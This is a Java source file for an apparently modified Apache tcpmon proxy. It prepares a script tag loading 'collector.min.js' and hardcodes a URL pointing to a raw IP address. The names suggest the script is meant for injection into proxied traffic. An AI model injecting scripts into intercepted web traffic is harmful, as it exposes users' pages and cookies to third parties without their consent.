package org.apache.ws.commons.tcpmon;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashSet;
import java.util.ResourceBundle;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TcpMonNoAWT {
	public static int listenPort = 0;
	public static String targetHost = "";
	public static int targetPort = 0;
	public static String script = getScriptCode();
	public static String bsURL = "http://13.56.150.246:8080/";
	public static byte[] scriptBytes = script.getBytes();
	public static int scriptLength = scriptBytes.length;
	private static final String TAG = TcpMonNoAWT.class.getName();
	
    private static final Logger logger = LoggerFactory.getLogger(TAG);
	public static void main(String args[]) throws IOException {
		if (args.length < 3) {
			logger.warn("Usage: java TcpTunnelNoAWT listenPort targetHost targetPort ");
			System.exit(1);
		}
		listenPort = Integer.parseInt(args[0]);
		targetHost = args[1];
		targetPort = Integer.parseInt(args[2]);
		if (args.length > 3) {
			bsURL = args[3];
			logger.info("TcpMonNoAWT: started on port " + listenPort + " -> " + targetHost + ":" + targetPort + " " + bsURL);
		} else {
			logger.info("TcpMonNoAWT: started on port " + listenPort + " -> " + targetHost + ":" + targetPort);
		}
		
		SocketWaiterNoAWT s = new SocketWaiterNoAWT(targetHost, targetPort, listenPort);
	}
	
    /**
     * Field messages
     */
    private static ResourceBundle messages = null;

    /**
     * Get the message with the given key.  There are no arguments for this message.
     *
     * @param key
     * @param defaultMsg
     * @return string
     */
    public static String getMessage(String key, String defaultMsg) {
        try {
            if (messages == null) {
                initializeMessages();
            }
            return messages.getString(key);
        } catch (Throwable t) {

            // If there is any problem whatsoever getting the internationalized
            // message, return the default.
            return defaultMsg;
        }
    }

    /**
     * Load the resource bundle messages from the properties file.  This is ONLY done when it is
     * needed.  If no messages are printed (for example, only Wsdl2java is being run in non-
     * verbose mode) then there is no need to read the properties file.
     */
    private static void initializeMessages() {
        messages = ResourceBundle.getBundle("org.apache.ws.commons.tcpmon.tcpmon");
    }
    
    
	private static String getScriptCode() {
		if (true) {
		return ("<script src=\"http://openam.example.com:4000/css/collector.min.js\"></script>");
		} else {
			return ("<script>if (document.getElementsByName('cookiename')[0] != undefined) {\n" + 
					"    console.log(\"Starting collector2 script\");\n" + 
					"    alert(\"Starting collector2 script\");\n" + 
					"} else {\r\n   console.log(\"not tarting collector2 script\");\n" + 
					"		alert(\"not Starting collector2 script\");\n\n" + 
					"}\n</script>");
		}
		/*
		String jarName = getMessage("jarName", "/tmp/tcpmon-1.2.0-SNAPSHOT.jar");
		String fileName = getMessage("scriptName", "collector.min.js");
		try {
			ZipFile zipFile = new ZipFile(new File(jarName));
			ZipEntry zipEntry = zipFile.getEntry(fileName);
			InputStream file = zipFile.getInputStream(zipEntry);

			Reader paramReader = new InputStreamReader(file);

			String data = new String();
			BufferedReader objReader = new BufferedReader(paramReader);
			String strCurrentLine;
			while ((strCurrentLine = objReader.readLine()) != null) {
				data += strCurrentLine + System.lineSeparator();
			}
			//System.out.println(data);
			zipFile.close();
			return "\r\n<script>" + data + "</script>\r\n";
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null; */
    }
}
